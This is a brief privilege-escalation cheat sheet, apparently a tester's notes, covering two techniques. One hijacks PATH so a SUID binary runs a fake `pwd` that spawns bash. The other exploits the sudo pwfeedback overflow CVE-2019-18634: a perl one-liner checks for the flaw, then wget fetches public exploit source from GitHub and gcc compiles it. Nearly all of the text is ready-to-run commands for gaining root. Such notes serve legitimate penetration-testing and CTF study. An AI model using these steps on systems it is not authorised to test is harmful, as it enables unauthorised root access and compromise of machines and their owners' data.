# Exploiting PATH with SUID binary
Whenever there's a SUID binary, and that binary executes other binaries without using the full path, we can use that to get code exec.

Example: `vuln` binary with SUID set, runs `pwd` without specifying the full path.
We can create a `pwd` file in /tmp that runs `/bin/bash`
Then we set `PATH=/tmp:$PATH` and run `vuln`. Our binary will then be executed with the permissions of the owner of vuln

# Sudo with pwfeedforward enabled BoF (CVE-2019-18634)
1. Check if pwfeedforward is enabled (Asterisks when asked to enter sudo password)
2. Check if vulnerable (`perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id`). If segfault => vulnerable
3. Exploit 
```bash
wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
gcc -o exploit exploit.c
```
